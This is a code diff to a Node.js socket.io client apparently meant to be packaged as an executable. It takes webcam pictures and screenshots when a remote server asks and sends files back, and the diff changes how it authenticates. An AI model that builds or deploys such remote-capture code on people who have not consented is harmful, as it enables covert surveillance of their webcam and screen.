@@ -35,17 +35,22 @@ function send_file(socket, filename, command) {
 }
 
 /* Package these variables in exe */
-const DEVICE_ID = 'device001'; // This should be sent too
+const DEVICE_ID = 1; // This should be sent too
 const APP_ID = '001';
 const USER = 'a';
 /*********************************/
 
-var socket = io.connect('http://' + HOST + ':' + PORT,
-    {query: {token: APP_ID, user: USER}});
+var socket = io.connect('http://' + HOST + ':' + PORT);
     
 var platform = os.platform();
 
 socket.on('connect', function () {
+    socket.emit('authenticate', {app_id: APP_ID, device_id: DEVICE_ID});
+    
+    //TODO: stop client from sending other commands until authenticated and 
+    // until asked for commands 
+    
+    
     socket.on('take_webcam_picture', function() {
         
         if (platform == 'linux') {
@@ -72,6 +77,7 @@ socket.on('connect', function () {
         }
     });
     
+    //TODO: Store photo in a "generated_files" dir
     socket.on('take_screenshot', function() {
         if (platform == 'linux') {
             exec('gnome-screenshot -f screenshot.jpg', (err, stdout, stderr) => {
